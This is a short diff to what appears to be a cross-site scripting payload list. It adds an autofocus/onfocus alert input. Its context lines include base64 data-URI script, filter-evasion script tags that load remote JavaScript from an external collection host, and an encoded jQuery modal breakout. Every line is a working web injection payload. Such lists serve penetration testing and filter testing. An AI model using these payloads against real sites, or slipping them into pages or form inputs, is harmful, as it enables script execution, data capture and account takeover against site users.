@@ -124,3 +124,5 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==
 '"><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://glc.xss.ht"></SCRIPT>
 '">&lt;SCRIPT SRC=https://glc.xss.ht&gt;&lt;/SCRIPT&gt;
 <a>%27%2C+function%20%28%29%20%7B%0aalert%281%29;%0a});%0aalert(1);%0a+$(document).on('show.bs.modal','#modaleGenerico_<a>
+<input autofocus onfocus=alert(1)>
+
